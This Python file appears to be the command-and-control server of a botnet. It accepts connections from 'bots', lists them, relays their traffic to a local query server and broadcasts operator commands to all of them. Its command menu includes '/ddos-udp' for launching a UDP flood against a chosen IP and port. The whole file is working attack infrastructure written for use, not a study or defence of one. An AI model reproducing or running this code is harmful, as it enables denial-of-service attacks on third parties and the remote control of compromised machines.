import socket
import threading
from dataset import Dataset
from loguru import logger
from colorama import Fore, Back, Style
import logging
from LoggingFormat import LogFormat
from LDS import logo
from Config import CFG


class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = []
        self.server_socket = None

        self.cfg = CFG()

        # YAML configuration
        self.configuration = self.cfg.GetCFG()

        self.botTable = self.configuration['LibeBotaTableFile']

        self.lds = self.configuration['Logo']
        self.lds2 = self.configuration['Logo2']

        self.ldsList = [self.lds, self.lds2]

        self.LoggHandler = self.configuration['DeepLogHandler']

        #   Deep Logger
        self.Deeplogger = logging.getLogger()
        self.Deeplogger.setLevel(logging.DEBUG)

        file_handler = logging.FileHandler(self.LoggHandler)
        file_handler.setLevel(logging.DEBUG)

        log_formatter = LogFormat()
        file_handler.setFormatter(log_formatter)

        # добавление обработчика файла в регистратор логов
        self.Deeplogger.addHandler(file_handler)

        # LDS module
        self.lds = logo(self.ldsList)

        # QServer
        self.Q = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.Q.connect(('localhost', 7777))

    def log(self, type, data) -> None:
        serverTitle = Style.BRIGHT + Fore.BLUE + "Server[OUT](Con.Log)" + Style.NORMAL
        deepData = data
        data = f"{serverTitle} : {data}"

        if type == "info":
            logger.info(data)
            self.Deeplogger.info(deepData)

        elif type == "debug":
            logger.debug(data)
            self.Deeplogger.debug(deepData)

        elif type == "waring":
            logger.warning(data) 
            self.Deeplogger.warning(deepData)

        elif type == "error":
            logger.error(data)
            self.Deeplogger.error(deepData)

        elif type == "critical":
            logger.critical(data)
            self.Deeplogger.critical(deepData)

    def start(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)

        self.lds.shw(self.host, self.port)

        # Запуск потока для чтения сообщений из терминала
        input_thread = threading.Thread(target=self.console)
        input_thread.start()
        self.Deeplogger.debug("Console.Thread $Start")

        while True:
            client_socket, client_address = self.server_socket.accept()

            print(" ")

            self.log("info", f"New connection <{client_address}>:S85")
            #self.log("debug", f"Socket - (({client_socket})):S86")

            #print(".(Type Enter to countinue)")

            self.clients.append(client_socket)

            # Обработка подключения клиента в отдельном потоке
            client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
            client_thread.start()
            self.Deeplogger.info(f"new Thread {client_address}")

    def get_raddr(self, socket_string) -> (int, str):
        start_index = socket_string.find("raddr=(")

        if start_index == -1:
                return None, None

        end_index = socket_string.find(")", start_index + 7)
        if end_index == -1:
            return None, None

        raddr_string = socket_string[start_index + 7:end_index]
        raddr_list = raddr_string.split(", ")

        ip = raddr_list[0].strip("'")
        port = int(raddr_list[1])

        return ip, port
        
    def handle_client(self, client_socket):
        while True:
            try:
                message = client_socket.recv(1024).decode()
                tildaCount = message.count("~")

                self.Deeplogger.debug(f"Fmsg >> {message}")

                if tildaCount > 1:
                    queue = message.split("~")
                    self.Deeplogger.debug(f"![i] queue -> {queue}")
                    for request in queue:
                        if request != "":
                            ip, port = self.get_raddr(str(client_socket)) 
                            data = f"{request}&{ip}&{port}"        
                            dts = data.encode()

                            self.Deeplogger.debug(f"handler data in queue : {data}")
                            
                            self.Q.send(dts)

                else:
                    self.Deeplogger.debug(f"[!Q] Empty queue >> {message}")     
                    ip, port = self.get_raddr(str(client_socket)) 
                    data = f"{message}&{ip}&{port}"
                    self.Deeplogger.debug(f"data to Query Server : {data}")          
                    data = data.replace("~", "")
                    if message != "":
                        dts = data.encode()
                        self.Q.send(dts)

                    else:
                        self.clients.remove(client_socket)
                        break
            except:
                self.clients.remove(client_socket)
                break

    def broadcast(self, message:str):        
        for client in self.clients:
            client.send(message.encode())


    def source(self, cmd:str):
        cmdList = ["/msg : Broadcast",
                   "/ddos-udp : Start a udp flood attack [ usage > /ddos-udp 127.0.0.1 53 -c 128000 ]",
                   "/bot-status : Bots return connection status on Query Server",
                   "@bot : Bot list",
                   "$panic : to server down",
                   "$log : show last n loggs",
                   "$lds : Call Lds"
                   ]

        if cmd:
            if cmd[0] == "/":
                self.Deeplogger.info(f"[/Broadcast] ({cmd})")
                self.broadcast(cmd)

            elif cmd == "@bot":
                if len(self.clients) == 0:
                    print("[@bot]() - 0 bots conected")
                
                elif len(self.clients) > 0:
                    online = Fore.GREEN + "online" + Fore.RESET 
                    bt = Fore.YELLOW + "BOTS" + Fore.RESET
                    bc = Fore.YELLOW + str(len(self.clients)) + Fore.RESET
                    
                    print(f"┬ {bt}")
                    for bot in self.clients:
                        print(f"├─ {online} {bot}")

                    print("└", end = '')
                    print("─"*4, f"[@bot]() - {bc} bots conected")

                else:
                    self.Deeplogger.warning("@bot error - ERR <List len>")

            elif cmd == "$log":
                self.isLogging = True
                
                try:
                    self.logState = int(input("[Loggs](count) > ")) 
                except Exception as e:
                    print(f"\n{e}\n")

                with open(self.LoggHandler, 'r') as file:
                    lines = file.readlines()
                    lastnlines = [line.strip() for line in lines[-self.logState:]][::-1]
                    
                    title = Fore.YELLOW + "LOGGS (DEEP)" 
                    loggsT = Fore.YELLOW + str(self.logState) + Fore.RESET
                    loggsEnd = Fore.YELLOW + "END" + Fore.RESET

                    print(f"\n{title}")
                    print("="*64, loggsT, "="*60, "\n")          
                    for log in lastnlines:
                        print("{log}"+f" {log}\n")

                    print("="*64, loggsEnd, "="*60)          

            elif cmd == '$lds':
                self.lds.shw(self.host, self.port)

            elif cmd == "$panic":
                self.Deeplogger.critical("Panic func is broken, it will/(or was, if u see this msg) down EVERYTHING")
                exit()

            elif cmd == "help":
                print(f"\n- - CMDS list - -")
                for cmd in cmdList:
                    print(f"|- - {cmd}")
                print("\n")

            else:
                self.Deeplogger.warning(f"[Unknown input]({cmd})")

    def console(self):
        st = Fore.CYAN + "Server" + Fore.RESET
        arr = Fore.CYAN + "> "+ Fore.RESET
        title = f"[{st}](cmd) {arr}"
        while True:
            cmd = input(title)
            self.source(cmd)

    def stop(self):
        for client in self.clients:
            client.close()
        self.server_socket.close()
        print("Server stopped")


if __name__ == '__main__':
    C = CFG()
    sHost, sPort = (C.GetCFG()["serverHost"], C.GetCFG()["serverPort"])
    server = Server(sHost, sPort)
    server.start()
    